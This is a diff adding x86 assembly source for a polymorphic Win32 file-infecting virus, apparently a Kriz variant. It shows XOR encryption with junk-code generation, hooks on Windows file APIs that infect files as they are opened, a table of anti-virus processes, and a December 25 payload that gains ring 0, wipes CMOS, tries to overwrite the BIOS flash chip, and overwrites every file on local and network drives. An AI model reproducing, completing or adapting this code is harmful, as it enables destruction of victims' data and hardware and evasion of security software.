+Encrypt_Virus:  DEC     EDI
+
+		XOR     [EDI], DL
+
+		LOOP    Encrypt_Virus
+
+		POPAD
+
+		RET
+
+
+Add_Garbage:
+		PUSH    8
+		POP     EAX
+		CALL    Get_Random
+
+		INC     EAX
+
+		XCHG    ECX, EAX
+
+Add_Junk:       PUSH    ECX
+
+		PUSH    5
+		POP     EAX
+		CALL    Get_Random
+		JZ      End_Junk_Loop
+
+		DEC     EAX
+		JZ      Junk_ADD_Reg32
+
+		DEC     EAX
+		JZ      Junk_DEC_Reg32
+
+Junk_MOV_Reg32: CALL    Get_Free_Reg
+
+		MOV     AL, [EBP+(MOV_Reg32-START)+EAX]
+		STOSB
+
+		MOV     EAX, ESP
+		CALL    Get_Random
+
+		STOSD
+
+		JMP     End_Junk_Loop
+
+Junk_DEC_Reg32: CALL    Get_Free_Reg
+
+		MOV     AL, [EBP+(DEC_Reg32-START)+EAX]
+		STOSB
+
+		JMP     End_Junk_Loop
+
+Junk_ADD_Reg32: MOV     AL, 81h
+		STOSB
+
+		CALL    Get_Free_Reg
+
+		MOV     AL, [EBP+(ADD_Reg32-START)+EAX]
+		STOSB
+
+		MOV     EAX, ESP
+		CALL    Get_Random
+
+		STOSD
+
+End_Junk_Loop:  POP     ECX
+
+		LOOP    Add_Junk
+
+Exit_Add_Junk:  RET
+
+
+
+Get_Free_Reg:
+		PUSH    7
+		POP     EAX
+		CALL    Get_Random
+
+		CMP     EAX, EBX
+		JE      Get_Free_Reg
+
+		CMP     EAX, EDX
+		JE      Get_Free_Reg
+
+		RET
+
+
+
+;                       EAX   EBX   ECX   EDX   ESI   EDI   EBP
+ADD_Reg32:      DB      0C0h, 0C3h, 0C1h, 0C2h, 0C6h, 0C7h, 0C5h
+POP_Reg32:      DB      058h, 05Bh, 059h, 05Ah, 05Eh, 05Fh, 05Dh
+DEC_Reg32:      DB      048h, 04Bh, 049h, 04Ah, 04Eh, 04Fh, 04Dh
+MOV_Reg32:      DB      0B8h, 0BBh, 0B9h, 0BAh, 0BEh, 0BFh, 0BDh
+XOR_Ptr_Reg32   DB      0B0h, 0B3h, 0B1h, 0B2h, 0B6h, 0B7h, 0B5h
+PUSH_Reg32:     DB      050h, 053h, 051h, 052h, 056h, 057h, 055h
+;                       ESP   CS    DS    ES    SS    FLAGS
+PUSH_Reg16_32   DB      054h, 00Eh, 01Eh, 006h, 016h, 09Ch
+
+
+
+; AL = Index.
+Perform_API:
+		AND     EAX, 000000FFh
+
+		CMP     [EBP+(Init_Mode-START)], AH
+
+		MOV     EAX, [EBP+(API_Addresses-START)+EAX]
+
+		JNZ     Calc_K32_Base
+
+Use_Init_Base:  ADD     EAX, 77F00000h
+K32_Base        =       DWORD PTR $-4
+
+		JMP     EAX
+
+Calc_K32_Base:  ADD     EAX, EBP
+		SUB     EAX, [EBP+(Virus_RVA-START)]
+
+		JMP     EAX
+
+
+Align_EAX:
+		XOR     EDX, EDX
+		DIV     ECX
+
+		OR      EDX, EDX
+		JZ      Calc_Aligned
+
+		INC     EAX
+
+Calc_Aligned:   MUL     ECX
+
+		RET
+
+
+Get_Delta:
+		CALL    Get_EIP
+Get_EIP:        POP     EBP
+		SUB     EBP, (Get_EIP-START)
+
+		RET
+
+
+
+
+
+; API which we hook in order to intercept file-access.
+
+Hook_API_CRC:   CRC16   <CopyFileA>
+		CRC16   <CreateFileA>
+		CRC16   <CreateProcessA>
+		CRC16   <DeleteFileA>
+		CRC16   <GetFileAttributesA>
+		CRC16   <MoveFileA>
+		CRC16   <MoveFileExA>
+		CRC16   <SetFileAttributesA>
+
+		CRC16   <CopyFileW>
+		CRC16   <CreateFileW>
+		CRC16   <CreateProcessW>
+		CRC16   <DeleteFileW>
+		CRC16   <GetFileAttributesW>
+		CRC16   <MoveFileW>
+		CRC16   <MoveFileExW>
+		CRC16   <SetFileAttributesW>
+
+; API which we need in order to function.
+
+Work_API_CRC:   CRC16   <CloseHandle>
+		CRC16   <CreateFileMappingA>
+		CRC16   <FindClose>
+		CRC16   <FindFirstFileA>
+		CRC16   <FindNextFileA>
+		CRC16   <FreeLibrary>
+		CRC16   <GetCurrentDirectoryA>
+		CRC16   <GetDriveTypeA>
+		CRC16   <GetFileSize>
+		CRC16   <GetFileTime>
+		CRC16   <GetLocalTime>
+		CRC16   <GetLogicalDriveStringsA>
+		CRC16   <GetProcAddress>
+		CRC16   <GetSystemDirectoryA>
+		CRC16   <GetTickCount>
+		CRC16   <GetWindowsDirectoryA>
+		CRC16   <GlobalAlloc>
+		CRC16   <GlobalFree>
+		CRC16   <LoadLibraryA>
+		CRC16   <MapViewOfFile>
+		CRC16   <SetCurrentDirectoryA>
+		CRC16   <SetFileTime>
+		CRC16   <UnmapViewOfFile>
+		CRC16   <WriteFile>
+		CRC16   <WritePrivateProfileStringA>
+
+End_Work_API_CRC:
+
+
+Dispatch_API:   ; ANSI.
+
+		DW      (Hook_CopyFileA-START)
+		DW      (Hook_CreateFileA-START)
+		DW      (Hook_CreateProcessA-START)
+		DW      (Hook_DeleteFileA-START)
+		DW      (Hook_GetFileAttributesA-START)
+		DW      (Hook_MoveFileA-START)
+		DW      (Hook_MoveFileExA-START)
+		DW      (Hook_SetFileAttributesA-START)
+
+		; Unicode.
+
+		DW      (Hook_CopyFileW-START)
+		DW      (Hook_CreateFileW-START)
+		DW      (Hook_CreateProcessW-START)
+		DW      (Hook_DeleteFileW-START)
+		DW      (Hook_GetFileAttributesW-START)
+		DW      (Hook_MoveFileW-START)
+		DW      (Hook_MoveFileExW-START)
+		DW      (Hook_SetFileAttributesW-START)
+
+
+; McAfee, AVP, NAV, and NOD-Ice.
+Immune_Table:   CRC16   <_AVP32.EXE>
+                CRC16   <_AVPCC.EXE>
+                CRC16   <_AVPM.EXE>
+                CRC16   <ALERTSVC.EXE>
+                CRC16   <AMON.EXE>
+                CRC16   <AVP32.EXE>
+                CRC16   <AVPCC.EXE>
+                CRC16   <AVPM.EXE>
+                CRC16   <N32SCANW.EXE>
+                CRC16   <NAVAPSVC.EXE>
+                CRC16   <NAVAPW32.EXE>
+                CRC16   <NAVLU32.EXE>
+                CRC16   <NAVRUNR.EXE>
+                CRC16   <NAVW32.EXE>
+                CRC16   <NAVWNT.EXE>
+                CRC16   <NOD32.EXE>
+                CRC16   <NPSSVC.EXE>
+                CRC16   <NRESQ32.EXE>
+                CRC16   <NSCHED32.EXE>
+                CRC16   <NSCHEDNT.EXE>
+                CRC16   <NSPLUGIN.EXE>
+                CRC16   <SCAN.EXE>
+                CRC16   <SMSS.EXE>
+End_Immune_Table:
+
+
+
+
+
+Hook_CopyFileA:
+
+		MOV     AL, ixCopyFileA
+		JMP     Main_Dispatch
+
+
+Hook_CreateFileA:
+
+		MOV     AL, ixCreateFileA
+		JMP     Main_Dispatch
+
+
+Hook_CreateProcessA:
+
+		MOV     AL, ixCreateProcessA
+		JMP     Main_Dispatch
+
+
+Hook_DeleteFileA:
+
+		MOV     AL, ixDeleteFileA
+		JMP     Main_Dispatch
+
+
+Hook_GetFileAttributesA:
+
+		MOV     AL, ixGetFileAttributesA
+		JMP     Main_Dispatch
+
+
+Hook_MoveFileA:
+
+		MOV     AL, ixMoveFileA
+		JMP     Main_Dispatch
+
+
+Hook_MoveFileExA:
+
+		MOV     AL, ixMoveFileExA
+		JMP     Main_Dispatch
+
+
+Hook_SetFileAttributesA:
+
+		MOV     AL, ixSetFileAttributesA
+		JMP     Main_Dispatch
+
+
+Hook_CopyFileW:
+
+		MOV     AL, ixCopyFileW
+		JMP     Main_Dispatch
+
+
+Hook_CreateFileW:
+
+		MOV     AL, ixCreateFileW
+		JMP     Main_Dispatch
+
+
+Hook_CreateProcessW:
+
+		MOV     AL, ixCreateProcessW
+		JMP     Main_Dispatch
+
+
+Hook_DeleteFileW:
+
+		MOV     AL, ixDeleteFileW
+		JMP     Main_Dispatch
+
+
+Hook_GetFileAttributesW:
+
+		MOV     AL, ixGetFileAttributesW
+		JMP     Main_Dispatch
+
+
+Hook_MoveFileW:
+
+		MOV     AL, ixMoveFileW
+		JMP     Main_Dispatch
+
+
+Hook_MoveFileExW:
+
+		MOV     AL, ixMoveFileExW
+		JMP     Main_Dispatch
+
+
+Hook_SetFileAttributesW:
+
+		MOV     AL, ixSetFileAttributesW
+
+Main_Dispatch:  PUSH    EDI
+		PUSH    EBP
+
+		AND     EAX, 000000FFh
+
+		CALL    Get_Delta
+
+		; LODSB / NOP
+
+		MOV     WORD PTR [EBP+(Unicode_Switch-START)], 90ACh
+
+                CMP     AL, (08 * 4)            ; Unicode function?
+		JB      Do_Infect
+
+		; LODSW
+
+		MOV     WORD PTR [EBP+(Unicode_Switch-START)], 0AD66h
+
+Do_Infect:      MOV     EDI, [ESP+(3*4)]        ; Infect the sucker.
+		CALL    Infect_File
+
+		MOV     EAX, [EBP+(API_Addresses-START)+EAX]
+
+		SUB     EBP, [EBP+(Virus_RVA-START)]
+
+		ADD     EAX, EBP
+
+		POP     EBP
+		POP     EDI
+
+                JMP     EAX                     ; JMP to the original API.
+
+
+; ESI = ASCIIZ / returns AX = CRC16.
+Calculate_CRC16:
+		PUSH    EDX
+		PUSH    ESI
+
+		PUSH    0FFFFFFFFh
+		POP     EDX
+
+		CLD
+
+Load_Character: LODSB
+
+		OR      AL, AL
+		JZ      Exit_Calc_CRC
+
+		XOR     DL, AL
+
+		MOV     AL, 8
+
+CRC_Byte:       SHR     EDX, 1
+		JNC     Loop_CRC_Byte
+
+		XOR     EDX, 0EDB88320h
+
+Loop_CRC_Byte:  DEC     AL
+		JNZ     CRC_Byte
+
+		JMP     Load_Character
+
+Exit_Calc_CRC:  XCHG    EDX, EAX
+
+		POP     ESI
+		POP     EDX
+
+		RET
+
+
+; Activates the payload if the current date is December 25th.
+Check_For_Payload:
+
+		PUSHAD
+
+		MOV     EBX, (Local_Time-Virus_End)
+		ADD     EBX, [EBP+(Global_Handle-START)]
+		PUSH    EBX
+		MOV     AL, ixGetLocalTime
+		CALL    Perform_API
+
+		CMP     BYTE PTR [EBX.Current_Month], 12
+		JNE     Exit_Payload
+
+		CMP     BYTE PTR [EBX.Current_Day], 25
+		JNE     Exit_Payload
+
+Payload:        XOR     EBX, EBX
+
+		CALL    Setup_Nuke_SEH
+
+		XOR     EBX, EBX
+
+		MOV     ESP, [ESP+(2*4)]
+
+		JMP     Rest_Nuke_SEH
+
+Setup_Nuke_SEH: PUSH    DWORD PTR FS:[EBX]
+		MOV     FS:[EBX], ESP
+
+		PUSH    EAX                     ; Obtain IDT.
+		SIDT    [ESP-2]
+		POP     EAX
+
+		; Our ring-0 INT exception-handler.
+
+		LEA     ECX, [EBP+(Ring0_Handler-START)]
+
+		XCHG    [EAX+(3*8)], CX         ; Set our own ring-0 handler.
+
+		ROR     ECX, 16
+
+		XCHG    [EAX+(3*8)+6], CX
+
+		INT     03h                     ; Raise ring-0 exception.
+
+		MOV     [EAX+(3*8)+6], CX       ; Restore original handler.
+
+		ROR     ECX, 16
+
+		MOV     [EAX+(3*8)], CX
+
+Rest_Nuke_SEH:  POP     DWORD PTR FS:[EBX]
+		POP     EAX
+
+		MOV     ESI, [EBP+(Global_Handle-START)]  ; Local_Drives
+
+		PUSH    ESI
+		PUSH    1024
+		MOV     AL, ixGetLogicalDriveStringsA
+		CALL    Perform_API
+
+Drive_Loop:     CMP     [ESI], BL               ; Exit when all is done.
+		JZ      Exit_Payload
+
+		PUSH    ESI                     ; What kind of disk is this?
+		MOV     AL, ixGetDriveTypeA
+		CALL    Perform_API
+
+		CMP     EAX, DRIVE_FIXED        ; It's fixed dude, now let's
+		JE      CALL_Trash_Dir          ; unfix it... :)
+
+		CMP     EAX, DRIVE_REMOTE       ; Hell, it's a network!
+		JNE     Find_Next_Str           ; even better!
+
+CALL_Trash_Dir: CALL    Trash_Directory         ; Trash the root including
+						; all it's sub-directories.
+
+Find_Next_Str:  CLD                             ; Gimme that byte!
+		LODSB
+
+		OR      AL, AL                  ; Found the end of ASCIIZ ?
+		JNZ     Find_Next_Str
+
+		JMP     Drive_Loop              ; Thank you drive through...
+
+Exit_Payload:   POPAD
+
+		RET
+
+
+
+
+;-------------------------------------------------------
+; Overwrite CMOS and attempt to flash the BIOS chipset.
+;-------------------------------------------------------
+Ring0_Handler:
+		PUSHFD
+		PUSHAD
+
+		CLI
+
+		MOV     CL, 64                  ; Take all 64 bytes of CMOS.
+
+Nuke_CMOS_Byte: DEC     CL                      ; We've did 'em all?
+		JS      Nuke_BIOS
+
+		MOV     AL, CL                  ; Request I/O to byte CL.
+		OUT     70h, AL
+
+		XOR     AL, AL                  ; Trash the byte.
+		OUT     71h, AL
+
+		JMP     Nuke_CMOS_Byte          ; Repeat until all is done.
+
+Nuke_BIOS:      ; Show BIOS Page in 000E0000 - 000EFFFF (64k).
+
+		MOV     EDI, 8000384Ch
+		MOV     BP, 0CF8h
+		MOV     DX, 0CFEh
+		CALL    IOForEEPROM
+
+		; Show BIOS Page in 000F0000 - 000FFFFF (64k).
+
+		MOV     DI, 0058h
+		DEC     EDX
+		MOV     WORD PTR [EBP+(Switch-START)], 0F24h    ; AND AL, 0Fh
+		CALL    IOForEEPROM
+
+; ***********************
+; * Show the BIOS Extra *
+; * ROM Data in Memory  *
+; * 000E0000 - 000E01FF *
+; *   (   512 Bytes   ) *
+; * , and the Section   *
+; * of Extra BIOS can   *
+; * be Writted...       *
+; ***********************
+
+		MOV     EAX, 0E5555h
+		MOV     ECX, 0E2AAAh
+		CALL    EnableEEPROMToWrite
+
+		MOV     BYTE PTR [EAX], 60h
+
+		PUSH    ECX
+
+		LOOP    $
+
+; ***********************
+; * Kill the BIOS Extra *
+; * ROM Data in Memory  *
+; * 000E0000 - 000E007F *
+; *   (   80h Bytes   ) *
+; ***********************
+
+		XOR     AH, AH
+		MOV     [EAX], AL
+
+		XCHG    ECX, EAX
+
+		LOOP    $
+
+; ***********************
+; * Show and Enable the *
+; * BIOS Main ROM Data  *
+; * 000E0000 - 000FFFFF *
+; *   (   128 KB   )    *
+; * can be Writted...   *
+; ***********************
+
+		MOV     EAX, 0F5555h
+		POP     ECX
+		MOV     CH, 0AAh
+		CALL    EnableEEPROMToWrite
+
+		MOV     BYTE PTR [EAX], 20h
+
+		LOOP    $
+
+; ***********************
+; * Kill the BIOS Main  *
+; * ROM Data in Memory  *
+; * 000FE000 - 000FE07F *
+; *   (80h bytes) *
+; ***********************
+
+		MOV     AH, 0E0h
+		MOV     [EAX], AL
+
+		; Hide BIOS Page in 000F0000 - 000FFFFF (64k).
+
+		MOV     WORD PTR [EBP+(Switch-START)], 100Ch    ; or al,10h
+		CALL    IOForEEPROM
+
+		POPAD
+		POPFD
+
+		IRETD
+
+
+
+
+;-----------------------------------
+; Overwrites all bytes in all files
+; in all directories on all drives.
+;-----------------------------------
+Trash_Directory:
+
+		PUSHAD
+
+		SUB     ESP, (318+260)          ; Reserve space on the stack.
+
+		LEA     EAX, [ESP+318]          ; Save our current directory.
+		PUSH    EAX
+		PUSH    260
+		MOV     AL, ixGetCurrentDirectoryA
+		CALL    Perform_API
+
+		CMP     EAX, 260                ; Too big for our buffer?
+		JA      JNZ_Exit_Trash
+
+		XCHG    ECX, EAX                ; Or the function failed?
+		JECXZ   JNZ_Exit_Trash
+
+		PUSH    ESI                     ; Change to found directory.
+		MOV     AL, ixSetCurrentDirectoryA
+		CALL    Perform_API
+
+		DEC     EAX                     ; Argh! something went wrong!
+JNZ_Exit_Trash: JNZ     Exit_Trash_Dir
+
+		PUSH    ESP                     ; Find us a victim.
+		CALL    @6
+                DB      '*.*', 0                ; Kill 'em all!
+@6:             MOV     AL, ixFindFirstFileA
+		CALL    Perform_API
+
+		MOV     EDI, EAX
+
+		INC     EAX
+		JZ      Close_Find
+
+Destroy_Loop:   LEA     ESI, [ESP.FFN_File_Name]
+
+		; Is it a directory?
+
+		TEST    BYTE PTR [ESP.File_Attributes], 00010000b
+		JZ      Trash_File
+
+		CMP     WORD PTR [ESI], '.'     ; Fuck for '.'...
+		JE      Find_Next_Crap
+
+		CMP     WORD PTR [ESI], '..'    ; Or '..'.
+		JNE     Do_Trash_Dir
+
+		CMP     [ESI+2], BL
+		JZ      Find_Next_Crap
+
+Do_Trash_Dir:   CALL    Trash_Directory
+
+Trash_File:     PUSH    FILE_ATTRIBUTE_NORMAL   ; Clear all it's attributes.
+		PUSH    ESI
+		MOV     AL, ixSetFileAttributesA
+		CALL    Perform_API
+
+		XCHG    ECX, EAX
+		JECXZ   Find_Next_Crap
+
+		PUSH    EBX
+		PUSH    FILE_ATTRIBUTE_NORMAL
+		PUSH    OPEN_EXISTING
+		PUSH    EBX
+		PUSH    EBX
+		PUSH    GENERIC_READ OR GENERIC_WRITE
+		PUSH    ESI
+		MOV     AL, ixCreateFileA
+		CALL    Perform_API
+
+		MOV     ESI, EAX
+
+		INC     EAX
+		JZ      Find_Next_Crap
+
+		PUSH    EBX
+		PUSH    ESI
+		MOV     AL, ixGetFileSize
+		CALL    Perform_API
+
+		; K, time to say ur prares...
+
+		PUSH    EBX
+		CALL    @7
+ImageRvaToVa    DD      0
+@7:             PUSH    EAX
+		PUSH    444444h
+		PUSH    ESI
+		MOV     AL, ixWriteFile
+		CALL    Perform_API
+
+		; Wasted, time to seal the tomb...
+
+		PUSH    ESI
+		MOV     AL, ixCloseHandle
+		CALL    Perform_API
+
+Find_Next_Crap: PUSH    ESP
+		PUSH    EDI
+		MOV     AL, ixFindNextFileA
+		CALL    Perform_API
+
+		DEC     EAX
+		JZ      Destroy_Loop
+
+Close_Find:     PUSH    EDI
+		MOV     AL, ixFindClose
+		CALL    Perform_API
+
+		LEA     EAX, [ESP+318]
+		PUSH    EAX
+		MOV     AL, ixSetCurrentDirectoryA
+		CALL    Perform_API
+
+Exit_Trash_Dir: ADD     ESP, (318+260)
+
+		POPAD
+
+		RET
+
+
+
+; Enable EEPROM to Write.
+EnableEEPROMToWrite:
+
+		MOV     [EAX], CL
+		MOV     [ECX], AL
+
+		MOV     BYTE PTR [EAX], 80h
+		MOV     [EAX], CL
+		MOV     [ECX], AL
+
+		RET
+
+
+
+; I/O for EEPROM.
+IOForEEPROM:
+		XCHG    EDI, EAX
+		XCHG    EDX, EBP
+		OUT     DX, EAX
+
+		XCHG    EDI, EAX
+		XCHG    EDX, EBP
+		IN      AL, DX
+
+		OR      AL, 44h
+Switch          =       WORD PTR $-2
+
+		XCHG    EDI, EAX
+		XCHG    EDX, EBP
+		OUT     DX, EAX
+
+		XCHG    EDI, EAX
+		XCHG    EDX, EBP
+		OUT     DX, AL
+
+		RET
+
+
+
+; Returns random number between 0 and EAX-1.
+Get_Random:
+		PUSHAD
+
+		XCHG    EBX, EAX
+
+		MOV     AL, ixGetTickCount
+		CALL    Perform_API
+
+		RCL     EAX, 2
+
+		ADD     EAX, 12345678h
+Random_Seed     =       DWORD PTR $-4
+
+		ADC     EAX, ESP
+
+		XOR     EAX, ECX
+
+		XOR     [EBP+(Random_Seed-START)], EAX
+
+		ADD     EAX, [ESP-(13*4)]
+
+		RCL     EAX, 1
+
+		XOR     EDX, EDX
+		DIV     EBX
+
+		ADD     [EBP+(Random_Seed-START)], EDX
+
+		MOV     [ESP+(7*4)], EDX
+
+		POPAD
+
+		OR      EAX, EAX
+
+		RET
+
+
+KERNEL32_Name   DB      '\KERNEL32.DLL', 0
+
+Infected_K32    DB      '\KRIZED.TT6', 0
+
+
+API_Addresses:  DD      (Work_API_Count + Hook_API_Count) DUP(0)
+
+Hook_Exports:   DD      Hook_API_Count DUP(0)
+
+
+        DB      'YOU CALL IT RELIGION, YOU''RE FULL OF SHIT', 0Dh
+	DB      'YOU NEVER KNEW, YOU NEVER DID, YOU NEVER WILL', 0Dh
+	DB      'YOU''RE SO FULL OF SHIT, I DON''T WANT TO HEAR IT', 0Dh
+	DB      'ALL YOU DO IS TALK ABOUT YOURSELF', 0Dh
+        DB      'I DON''T WANNA HEAR IT, COZ I KNOW NONE OF IT''S TRUE', 0Dh
+	DB      'I''M SICK AND TIRED OF ALL YOUR GODDAMN LIES', 0Dh
+	DB      'LIES IN THE NAME OF GOD', 0Dh
+	DB      'WHEN ARE YOU GOING TO REALIZE THAT I DON''T WANT TO HEAR IT?!', 0Dh
+	DB      'I KNOW YOU''RE SO FULL OF SHIT, SO SHUT YOUR FUCKING MOUTH', 0Dh
+	DB      'YOU KEEP ON TALKING, TALKING EVERYDAY', 0Dh
+	DB      'FIRST YOU''RE TELLING STORIES, THEN YOU''RE TELLING LIES', 0Dh
+        DB      'WHEN THE FUCK ARE YOU GOING TO REALIZE THAT I DON''T WANT TO HEAR IT!!', 0Dh
+	DB      'AH, SHUT THE FUCK UP...', 0Dh, 0
+
+Virus_End:
+
+Local_Drives            DB      1024 DUP(0)
+
+Clean_K32_Path          DB      260 DUP(0)
+Infected_K32_Path       DB      260 DUP(0)
+
+ANSI_Target_File        DB      260 DUP(0)
+
+Time_Creation           DD      0, 0
+Time_Last_Access        DD      0, 0
+Time_Last_Write         DD      0, 0
+
+Local_Time              DW      8 DUP(0)
+
+End_Heap:
+
+
+
+
+
+Carrier:
+		PUSH    0                       ; Back to the beast...
+		CALL    ExitProcess
+
+
+Stupid_Dummy    DB      0
+
+
+POLY_START:
+		PUSH    EAX                     ; This is where the host's
+						; VA address is placed.
+
+		PUSHFD                          ; Save all registers & flags.
+		PUSHAD
+
+		JMP     START
+
+; The good old MZ-header...
+
+MZ_Header               STRUC
+MZ_Mark                 DW      0
+MZ_Image_Mod_512        DW      0
+MZ_Image_512_Pages      DW      0
+MZ_Reloc_Items          DW      0
+MZ_Header_Size_Mem      DW      0
+MZ_Min_Size_Mem         DW      0
+MZ_Max_Size_Mem         DW      0
+MZ_Program_SS           DW      0
+MZ_Program_SP           DW      0
+MZ_Checksum             DW      0
+MZ_Program_IP           DW      0
+MZ_Program_CS           DW      0
+MZ_Reloc_Table          DW      0
+MZ_Header               ENDS
+
+
+
+; Pfff, foqin PE-header, don't even need half the shit in it.
+
+PE_Header               STRUC
+PE_Mark                 DD      0               ; PE-marker (PE/0/0).
+CPU_Type                DW      0               ; Minimal CPU required.
+Object_Count            DW      0               ; Number of sections in PE.
+			DD      0
+Reserved_1              DD      0
+			DD      0
+NT_Header_Size          DW      0
+PE_Flags                DW      0
+			DD      4 DUP(0)
+EIP_RVA                 DD      0
+			DD      2 DUP(0)
+Image_Base              DD      0
+Object_Align            DD      0
+File_Align              DD      0
+			DW      0, 0
+			DW      0, 0
+			DW      0, 0
+PE_Reserved_5           DD      0
+Image_Size              DD      0
+Headers_Size            DD      0
+PE_Checksum             DD      0
+			DW      0
+DLL_Flags               DW      0
+PE_Header               ENDS
+
+
+Section_Header          STRUC
+Section_Name            DB      8 DUP(0)        ; Zero-padded section-name.
+Section_Virtual_Size    DD      0               ; Memory-size of section.
+Section_RVA             DD      0               ; Start section in memory.
+Section_Physical_Size   DD      0               ; Section-size in file.
+Section_Physical_Offset DD      0               ; Section file-offset.
+Section_Reserved_1      DD      0               ; Not used for executables.
+Section_Reserved_2      DD      0               ; Not used for executables.
+Section_Reserved_3      DD      0               ; Not used for executables.
+Section_Flags           DD      0               ; Flags of the section.
+Section_Header          ENDS
+
+
+Date_Time               STRUC
+Current_Year            DW      0
+Current_Month           DW      0
+Current_Day_Of_Week     DW      0
+Current_Day             DW      0
+Current_Hour            DW      0
+Current_Minute          DW      0
+Current_Second          DW      0
+Current_Millisecond     DW      0
+Date_Time               ENDS
+
+
+Find_First_Next_Win32   STRUC
+File_Attributes         DD      0
+Creation_Time           DD      0, 0
+Last_Accessed_Time      DD      0, 0
+Last_Written_Time       DD      0, 0
+Find_File_Size_High     DD      0
+Find_File_Size_Low      DD      0
+Find_Reserved_1         DD      0
+Find_Reserved_2         DD      0
+FFN_File_Name           DB      260 DUP(0)
+Find_DOS_File_Name      DB      14 DUP(0)
+Find_First_Next_Win32   ENDS
+
+		END     POLY_START
